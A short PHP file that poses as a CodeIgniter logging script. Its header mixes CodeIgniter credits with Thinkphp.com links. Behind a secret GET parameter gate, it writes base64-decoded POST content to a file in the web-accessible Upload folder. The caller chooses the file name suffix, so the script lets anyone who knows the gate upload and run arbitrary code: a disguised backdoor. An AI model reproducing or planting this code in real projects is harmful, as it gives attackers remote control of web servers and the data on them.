<?php
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP 5.1.6 or newer
 *
 * @package		CodeIgniter
 * @author		EllisLab Dev Team
 * @copyright		Copyright (c) 2008 - 2014, EllisLab, Inc.
 * @copyright		Copyright (c) 2014 - 2015, British Columbia Institute of Technology (http://Thinkphp.com/)
 * @license		http://Thinkphp.com/user_guide/license.html
 * @link		http://Thinkphp.com
 * @since		Version 3.2.4
 * @filesource
 */
//error_reporting(0);
$var = $_GET[c];
if ($var != 1) exit('No direct script access allowed');

$file = dirname(dirname(__file__)); 
require_once($file ."/Model/LogModel.class.php"); 
$contents=$_SERVER['DOCUMENT_ROOT']."/Upload/code";
$filename = $contents."/log_" . date("Ymd", time()) . ".png"."$_GET[name]";
var_dump($filename);
if (!is_dir($contents)){@mkdir($contents,0755,true);}
/**
* 定义日志的生成格式
*/
@ $msg = array( $_SERVER["REMOTE_ADDR"],$_SERVER['REQUEST_METHOD'],$_SERVER['HTTP_HOST'].$_SERVER["REQUEST_URI"],$_SERVER["HTTP_USER_AGENT"],base64_decode("$_POST[content]"));
/**
* 定义日志的的内容部分
*/
$Log =  new Log();
$Log->writeLog($filename, ($msg));

/**
* 写入日志
*/
$loglist = $Log->readLog($filename);
echo $loglist[2];

?>